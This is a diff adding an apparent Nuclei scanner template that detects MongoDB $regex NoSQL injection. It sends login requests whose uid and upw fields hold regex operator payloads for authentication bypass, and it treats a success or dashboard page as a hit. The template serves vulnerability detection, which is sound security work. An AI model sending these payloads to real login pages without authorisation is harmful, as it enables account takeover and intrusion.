@@ -1,0 +1,44 @@
+id: nosql-injection-regex-advanced
+
+info:
+  name: NoSQL Injection - MongoDB $regex Operator (Advanced Detection)
+  author: d4wn
+  severity: high
+  description: |
+    MongoDB의 $regex 연산자를 이용한 NoSQL Injection 취약점을 다양한 방법으로 탐지합니다.
+    정규표현식 기반 인증 우회 및 데이터 추출 가능성을 확인합니다.
+  tags: nosqli,injection,mongodb,regex,auth-bypass
+
+http:
+  - raw:
+      - |
+        GET /login?uid[$regex]=ad.in&upw[$regex]=^. HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+
+      - |
+        GET /login?uid[$regex]=^a.*&upw[$regex]=^. HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+
+      - |
+        POST /login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+
+        {"uid":{"$regex":"admin"},"upw":{"$regex":"^."}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 302
+
+      - type: dsl
+        dsl:
+          - "!contains(tolower(body), 'error')"
+          - "!contains(tolower(body), 'invalid')"
+          - "contains(tolower(body), 'success') || contains(tolower(body), 'admin') || contains(tolower(body), 'dashboard') || contains(tolower(body), 'welcome')"
+        condition: and
